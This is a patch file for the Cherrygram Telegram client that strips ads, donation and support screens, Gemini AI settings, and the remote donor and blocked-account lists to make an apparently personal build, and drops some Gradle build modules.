++        RemoteConfigConstants.show_ads_screen_in_settings to false,
++        RemoteConfigConstants.show_ads_in_play_store_builds to false,
++        RemoteConfigConstants.always_show_adsgram_in_chats to false,
+ 
+         RemoteConfigConstants.videomessages_resolution to 512,
+         RemoteConfigConstants.use_braille_spoiler to false,
+diff --git a/TMessagesProj/src/main/java/uz/unnarsx/cherrygram/donates/DonatesManager.kt b/TMessagesProj/src/main/java/uz/unnarsx/cherrygram/donates/DonatesManager.kt
+index 441f621..2e977f9 100644
+--- a/TMessagesProj/src/main/java/uz/unnarsx/cherrygram/donates/DonatesManager.kt
++++ b/TMessagesProj/src/main/java/uz/unnarsx/cherrygram/donates/DonatesManager.kt
+@@ -41,64 +41,8 @@ object DonatesManager {
+ 
+     private val REFRESH_INTERVAL = if (CherrygramCoreConfig.isDevBuild()) 60 * 60 * 1000L else 6 * 60 * 60 * 1000L // 6 hours
+ 
+-    suspend fun startAutoRefresh(context: Context, force: Boolean, fromIntegrityChecker: Boolean) = coroutineScope {
+-        val lastUpdateTime = CherrygramCoreConfig.lastDonatesCheckTime
+-        val currentTime = System.currentTimeMillis()
+-
+-        if (fromIntegrityChecker || force || currentTime - lastUpdateTime > REFRESH_INTERVAL) {
+-            var progressDialog: AlertDialog? = null
+-
+-            if (force) {
+-                AndroidUtilities.runOnUIThread {
+-                    try {
+-                        progressDialog = AlertDialog(context, AlertDialog.ALERT_TYPE_SPINNER)
+-                        progressDialog.show()
+-                    } catch (e: Exception) {
+-                        CherrygramLogger.e(e, true)
+-                    }
+-                }
+-            }
+-
+-            try {
+-                val donateJob = async { updateDonateList(context) }
+-                val marketplaceJob = async { updateDonateListMarketplace(context) }
+-                val blockedJob = async { updateBlockedList(context) }
+-                val colorsJob = async { updateBadgeColors(context) }
+-                val tonRateJob = async { updateTonUsdtRate(context) }
+-
+-                awaitAll(donateJob, marketplaceJob, blockedJob, colorsJob, tonRateJob)
+-
+-                if (!force) showToast("Loaded remote donate list")
+-            } catch (e: Exception) {
+-                CherrygramLogger.e(e, true)
+-                showToast("Error loading donate list, using local cache")
+-
+-                if (!fromIntegrityChecker) {
+-                    loadLocalDonateList(context)
+-                    loadLocalDonateListMarketplace(context)
+-                    loadLocalBlockedList(context)
+-                    loadLocalBadgeColors(context, FILE_NAME_BADGE_COLORS)
+-                }
+-            } finally {
+-                CherrygramCoreConfig.lastDonatesCheckTime = System.currentTimeMillis()
+-                if (force) {
+-                    AndroidUtilities.runOnUIThread {
+-                        try {
+-                            progressDialog?.dismiss()
+-                            NotificationCenter.getInstance(UserConfig.selectedAccount).postNotificationName(NotificationCenter.cgDonatesLoaded)
+-                        } catch (e: Exception) {
+-                            CherrygramLogger.e(e, true)
+-                        }
+-                    }
+-                }
+-            }
+-        } else {
+-            loadLocalDonateList(context)
+-            loadLocalDonateListMarketplace(context)
+-            loadLocalBlockedList(context)
+-            loadLocalBadgeColors(context, FILE_NAME_BADGE_COLORS)
+-            showToast("Loaded local donate list")
+-        }
++    suspend fun startAutoRefresh(context: Context, force: Boolean, fromIntegrityChecker: Boolean) {
++        // Personal build does not download donor or blocked-account lists.
+     }
+ 
+     private fun showToast(text: String) {
+@@ -302,7 +246,7 @@ object DonatesManager {
+ 
+     fun isUserBlocked(userId: Long): Boolean {
+         synchronized(blockedUserIds) {
+-            return blockedUserIds.contains(userId)
++            return false
+         }
+     }
+     /** Blocked finish */
+diff --git a/TMessagesProj/src/main/java/uz/unnarsx/cherrygram/preferences/CGPreferencesEntry.java b/TMessagesProj/src/main/java/uz/unnarsx/cherrygram/preferences/CGPreferencesEntry.java
+index 71aeda2..d987bb7 100644
+--- a/TMessagesProj/src/main/java/uz/unnarsx/cherrygram/preferences/CGPreferencesEntry.java
++++ b/TMessagesProj/src/main/java/uz/unnarsx/cherrygram/preferences/CGPreferencesEntry.java
+@@ -117,30 +117,6 @@ public class CGPreferencesEntry extends BaseCGPreferencesEntry {
+                 )
+                 .slug(DeeplinkHelper.DeepLinksRepo.CG_Chats)
+         );
+-        items.add(
+-                SettingsActivity.SettingCell.Factory.of(
+-                        cameraRow,
+-                        0xFFE54C7F, 0xFFA33156,
+-                        R.drawable.settings_camera_filled_solar,
+-                        getString(R.string.CP_Category_Camera),
+-                        getString(R.string.CGP_Camera_Desc),
+-                        true
+-                )
+-                .slug(DeeplinkHelper.DeepLinksRepo.CG_Camera)
+-        );
+-        if (CherrygramExperimentalConfig.INSTANCE.getUse_CG_OOMHandler()) {
+-            items.add(
+-                    SettingsActivity.SettingCell.Factory.of(
+-                            experimentalRow,
+-                            IconBackgroundColors.PURPLE.top, IconBackgroundColors.PURPLE.bottom,
+-                            R.drawable.settings_tube_filled_solar,
+-                            getString(R.string.EP_Category_Experimental),
+-                            getString(R.string.CGP_Experimental_Desc),
+-                            true
+-                    )
+-                    .slug(DeeplinkHelper.DeepLinksRepo.CG_Experimental)
+-            );
+-        }
+         items.add(
+                 SettingsActivity.SettingCell.Factory.of(
+                         privacyRow,
+@@ -165,29 +141,7 @@ public class CGPreferencesEntry extends BaseCGPreferencesEntry {
+         );
+         items.add(UItem.asShadow(null));
+ 
+-        items.add(UItem.asHeader(getString(R.string.DP_Support)));
+-        items.add(
+-                SettingsActivity.SettingCell.Factory.of(
+-                        supportRow,
+-                        0xFFB659FF, 0xFF617CFF,
+-                        R.drawable.settings_support_filled_solar,
+-                        applyProSpan(getString(R.string.DP_DonateBadge), getResourceProvider())
+-                )
+-                .slug(DeeplinkHelper.DeepLinksRepo.CG_Support_Force)
+-        );
+-        if (!getConnectionsManager().isTestBackend()) {
+-            items.add(
+-                    SettingsActivity.SettingCell.Factory.of(
+-                            alternativeSupportRow,
+-                            0xFFF6538A, 0xFF581668,
+-                            R.drawable.settings_stars,
+-                            getString(R.string.AS_Header)
+-                    )
+-                    .slug(DeeplinkHelper.DeepLinksRepo.CG_Alternative_Support)
+-            );
+-        }
+-        if (CherrygramFirebaseConfig.INSTANCE.getShowProxyInSettings() && CGChatMenuInjector.INSTANCE.showProxyButton()) {
+-            items.add(UItem.asShadow(null));
++        items.add(UItem.asShadow(null));
+             items.add(
+                     SettingsActivity.SettingCell.Factory.of(
+                             proxyRow,
+diff --git a/TMessagesProj/src/main/java/uz/unnarsx/cherrygram/preferences/CherrygramPreferencesNavigator.kt b/TMessagesProj/src/main/java/uz/unnarsx/cherrygram/preferences/CherrygramPreferencesNavigator.kt
+index addf503..21e50d3 100644
+--- a/TMessagesProj/src/main/java/uz/unnarsx/cherrygram/preferences/CherrygramPreferencesNavigator.kt
++++ b/TMessagesProj/src/main/java/uz/unnarsx/cherrygram/preferences/CherrygramPreferencesNavigator.kt
+@@ -10,7 +10,6 @@
+ package uz.unnarsx.cherrygram.preferences
+ 
+ import org.telegram.ui.ActionBar.BaseFragment
+-import uz.unnarsx.cherrygram.donates.adsgram.AdsScreen
+ import uz.unnarsx.cherrygram.preferences.folders.FoldersPreferencesEntry
+ import uz.unnarsx.cherrygram.preferences.tabs.MainTabsPreferencesEntry
+ 
+@@ -41,7 +40,7 @@ object CherrygramPreferencesNavigator {
+         MessagesPreferencesEntry().also(fragment::presentFragment)
+ 
+     fun createGemini(fragment: BaseFragment): BaseFragment =
+-        GeminiPreferencesEntry().also(fragment::presentFragment)
++        MessagesPreferencesEntry().also(fragment::presentFragment)
+ 
+     fun createMessageFilter(fragment: BaseFragment): BaseFragment =
+         MessageFiltersPreferencesEntry().also(fragment::presentFragment)
+@@ -50,30 +49,30 @@ object CherrygramPreferencesNavigator {
+         MessageMenuPreferencesEntry().also(fragment::presentFragment)
+ 
+     fun createCamera(fragment: BaseFragment): BaseFragment =
+-        CameraPreferencesEntry().also(fragment::presentFragment)
++        CGPreferencesEntry().also(fragment::presentFragment)
+ 
+     fun createExperimental(fragment: BaseFragment): BaseFragment =
+-        ExperimentalPreferencesEntry().also(fragment::presentFragment)
++        CGPreferencesEntry().also(fragment::presentFragment)
+ 
+     fun createPrivacy(fragment: BaseFragment): BaseFragment =
+         PrivacyPreferencesEntry().also(fragment::presentFragment)
+ 
+     @JvmOverloads
+     fun createDonate(fragment: BaseFragment, force: Boolean = false): BaseFragment =
+-        DonatesPreferencesEntry().forceShowDonates(force).also(fragment::presentFragment)
++        CGPreferencesEntry().also(fragment::presentFragment)
+ 
+     fun createAlternativeSupport(fragment: BaseFragment): BaseFragment =
+-        AlternativeSupportScreen().also(fragment::presentFragment)
++        CGPreferencesEntry().also(fragment::presentFragment)
+ 
+-    fun createStars(fragment: BaseFragment, customTitle: String?, userName: String?, type: Int) = fragment.presentFragment(StarsIntroActivityCG(customTitle, userName, type))
++    fun createStars(fragment: BaseFragment, customTitle: String?, userName: String?, type: Int) { /* Promotional Stars page removed. */ }
+ 
+     fun createADS(fragment: BaseFragment): BaseFragment =
+-        AdsScreen().also(fragment::presentFragment)
++        CGPreferencesEntry().also(fragment::presentFragment)
+ 
+     fun createAbout(fragment: BaseFragment): BaseFragment =
+         AboutPreferencesEntry().also(fragment::presentFragment)
+ 
+     fun createDebug(fragment: BaseFragment): BaseFragment =
+-        DebugPreferencesEntry().also(fragment::presentFragment)
++        CGPreferencesEntry().also(fragment::presentFragment)
+ 
+ }
+\ No newline at end of file
+diff --git a/TMessagesProj/src/main/java/uz/unnarsx/cherrygram/preferences/GeneralPreferencesEntry.java b/TMessagesProj/src/main/java/uz/unnarsx/cherrygram/preferences/GeneralPreferencesEntry.java
+index 46306fd..fceead1 100644
+--- a/TMessagesProj/src/main/java/uz/unnarsx/cherrygram/preferences/GeneralPreferencesEntry.java
++++ b/TMessagesProj/src/main/java/uz/unnarsx/cherrygram/preferences/GeneralPreferencesEntry.java
+@@ -145,46 +145,6 @@ public class GeneralPreferencesEntry extends BaseCGPreferencesEntry {
+ 
+         items.add(UItem.asShadow(null));
+ 
+-        items.add(UItem.asHeader(getString(R.string.FilterStories)));
+-        items.add(SettingsHelper.asSwitchCG(hideStoriesRow, getString(R.string.CP_HideStories), getString(R.string.CP_HideStories_Desc))
+-                .setChecked(CherrygramCoreConfig.INSTANCE.getHideStories())
+-                .slug("hideStories")
+-        );
+-
+-        items.add(
+-                SettingsHelper.asExpandableSwitch(
+-                        archiveStoriesRow,
+-                        R.drawable.msg_archive,
+-                        getString(R.string.CP_ArchiveStories),
+-                        getArchiveStoriesCountText()
+-                )
+-                .setChecked(CherrygramCoreConfig.INSTANCE.getArchiveStoriesFromUsers() || CherrygramCoreConfig.INSTANCE.getArchiveStoriesFromChannels())
+-                .setCollapsed(!expandedArchiveStoriesSection)
+-                .setClickCallback(v -> {
+-                    boolean newValue = !(CherrygramCoreConfig.INSTANCE.getArchiveStoriesFromUsers() || CherrygramCoreConfig.INSTANCE.getArchiveStoriesFromChannels());
+-
+-                    CherrygramCoreConfig.INSTANCE.setArchiveStoriesFromUsers(newValue);
+-                    CherrygramCoreConfig.INSTANCE.setArchiveStoriesFromChannels(newValue);
+-
+-                    expandedArchiveStoriesSection = !expandedArchiveStoriesSection;
+-                    updateRows(true);
+-                })
+-                .slug("archiveStories")
+-        );
+-        if (expandedArchiveStoriesSection) {
+-            items.add(UItem.asRoundCheckbox(archiveStoriesUsersRow, getString(R.string.FilterContacts))
+-                    .setChecked(CherrygramCoreConfig.INSTANCE.getArchiveStoriesFromUsers())
+-                    .setPad(1)
+-            );
+-
+-            items.add(UItem.asRoundCheckbox(archiveStoriesChannelsRow, getString(R.string.FilterChannels))
+-                    .setChecked(CherrygramCoreConfig.INSTANCE.getArchiveStoriesFromChannels())
+-                    .setPad(1)
+-            );
+-        }
+-
+-        items.add(UItem.asShadow(getString(R.string.CP_ArchiveStories_Desc)));
+-
+         items.add(UItem.asHeader(getString(R.string.LocalMiscellaneousCache)));
+         items.add(SettingsHelper.asSwitchCG(useSystemEmojiRow, getString(R.string.AP_SystemEmoji))
+                 .setChecked(CherrygramCoreConfig.INSTANCE.getSystemEmoji())
+@@ -282,26 +242,6 @@ public class GeneralPreferencesEntry extends BaseCGPreferencesEntry {
+             ApplicationLoader.applicationContext.stopService(new Intent(ApplicationLoader.applicationContext, NotificationsService.class));
+             ApplicationLoader.startPushService();
+             showRestartBulletin();
+-        } else if (item.id == hideStoriesRow) {
+-            CherrygramCoreConfig.INSTANCE.setHideStories(!CherrygramCoreConfig.INSTANCE.getHideStories());
+-            SettingsHelper.updateCheckState(view, CherrygramCoreConfig.INSTANCE.getHideStories());
+-
+-            showRestartBulletin();
+-        } else if (item.id == archiveStoriesRow) {
+-            expandedArchiveStoriesSection = !expandedArchiveStoriesSection;
+-            item.collapsed = !item.collapsed;
+-
+-            updateRows(true);
+-        } else if (item.id == archiveStoriesUsersRow) {
+-            CherrygramCoreConfig.INSTANCE.setArchiveStoriesFromUsers(!CherrygramCoreConfig.INSTANCE.getArchiveStoriesFromUsers());
+-            SettingsHelper.updateCheckState(view, CherrygramCoreConfig.INSTANCE.getArchiveStoriesFromUsers());
+-
+-            updateRows(true);
+-        } else if (item.id == archiveStoriesChannelsRow) {
+-            CherrygramCoreConfig.INSTANCE.setArchiveStoriesFromChannels(!CherrygramCoreConfig.INSTANCE.getArchiveStoriesFromChannels());
+-            SettingsHelper.updateCheckState(view, CherrygramCoreConfig.INSTANCE.getArchiveStoriesFromChannels());
+-
+-            updateRows(true);
+         } else if (item.id == useSystemEmojiRow) {
+             CherrygramCoreConfig.INSTANCE.setSystemEmoji(!CherrygramCoreConfig.INSTANCE.getSystemEmoji());
+             SettingsHelper.updateCheckState(view, CherrygramCoreConfig.INSTANCE.getSystemEmoji());
+diff --git a/TMessagesProj/src/main/java/uz/unnarsx/cherrygram/preferences/MessagesPreferencesEntry.java b/TMessagesProj/src/main/java/uz/unnarsx/cherrygram/preferences/MessagesPreferencesEntry.java
+index dfb4eb3..62ff9f5 100644
+--- a/TMessagesProj/src/main/java/uz/unnarsx/cherrygram/preferences/MessagesPreferencesEntry.java
++++ b/TMessagesProj/src/main/java/uz/unnarsx/cherrygram/preferences/MessagesPreferencesEntry.java
+@@ -90,19 +90,6 @@ public class MessagesPreferencesEntry extends BaseCGPreferencesEntry {
+         );
+         items.add(UItem.asShadow(null));
+ 
+-        items.add(
+-                SettingsActivity.SettingCell.Factory.of(
+-                        geminiSettingsRow, 0xFF4796E3, 0xFF9177C7,
+-                        R.drawable.settings_magic_stick_filled_solar,
+-                        getString(R.string.CP_GeminiAI_Header)
+-                )
+-                .slug(DeeplinkHelper.DeepLinksRepo.CG_Gemini)
+-        );
+-        items.add(UItem.asButton(voiceTranscriptionRow, getString(R.string.CP_GeminiAI_VoiceTranscriptionProvider), getTranscriptionProviderValue())
+-                .slug("vttProvider")
+-        );
+-        items.add(UItem.asShadow(null));
+-
+         items.add(UItem.asHeader(getString(R.string.ActionsChartTitle)));
+         items.add(
+                 SettingsActivity.SettingCell.Factory.of(
+@@ -349,11 +336,7 @@ public class MessagesPreferencesEntry extends BaseCGPreferencesEntry {
+         configStringKeys.add(getString(R.string.Edit));
+         configValues.add(CherrygramMessagesConfig.DOUBLE_TAP_ACTION_EDIT);
+ 
+-        configStringKeys.add(getString(R.string.TranslateMessage));
+-        configValues.add(CherrygramMessagesConfig.DOUBLE_TAP_ACTION_TRANSLATE);
+ 
+-        configStringKeys.add(getString(R.string.TranslateMessage) + " - " + getString(R.string.CP_GeminiAI_Header));
+-        configValues.add(CherrygramMessagesConfig.DOUBLE_TAP_ACTION_TRANSLATE_GEMINI);
+ 
+         PopupHelper.show(configStringKeys, getString(R.string.CP_DoubleTapAction), configValues.indexOf(CherrygramMessagesConfig.INSTANCE.getDoubleTapAction()), getContext(), i -> {
+             CherrygramMessagesConfig.INSTANCE.setDoubleTapAction(configValues.get(i));
+@@ -381,11 +364,7 @@ public class MessagesPreferencesEntry extends BaseCGPreferencesEntry {
+         configStringKeys.add(getString(R.string.CG_ToSaved));
+         configValues.add(CherrygramMessagesConfig.MESSAGE_SLIDE_ACTION_SAVE);
+ 
+-        configStringKeys.add(getString(R.string.TranslateMessage));
+-        configValues.add(CherrygramMessagesConfig.MESSAGE_SLIDE_ACTION_TRANSLATE);
+ 
+-        configStringKeys.add(getString(R.string.TranslateMessage) + " - " + getString(R.string.CP_GeminiAI_Header));
+-        configValues.add(CherrygramMessagesConfig.MESSAGE_SLIDE_ACTION_TRANSLATE_GEMINI);
+ 
+         configStringKeys.add(getString(R.string.DirectShare));
+         configValues.add(CherrygramMessagesConfig.MESSAGE_SLIDE_ACTION_DIRECT_SHARE);
+diff --git a/settings.gradle b/settings.gradle
+index 85b189e..3ed522e 100644
+--- a/settings.gradle
++++ b/settings.gradle
+@@ -1,9 +1,5 @@
+ include ':TMessagesProj'
+-include ':TMessagesProj_App'
+-include ':TMessagesProj_AppHuawei'
+-include ':TMessagesProj_AppHockeyApp'
+ include ':TMessagesProj_AppStandalone'
+-include ':TMessagesProj_AppTests'
+ include ':jlatexmath'
+ project(':jlatexmath').projectDir = new File(rootDir, 'TMessagesProj/lib/jlatexmath/jlatexmath')
+ 
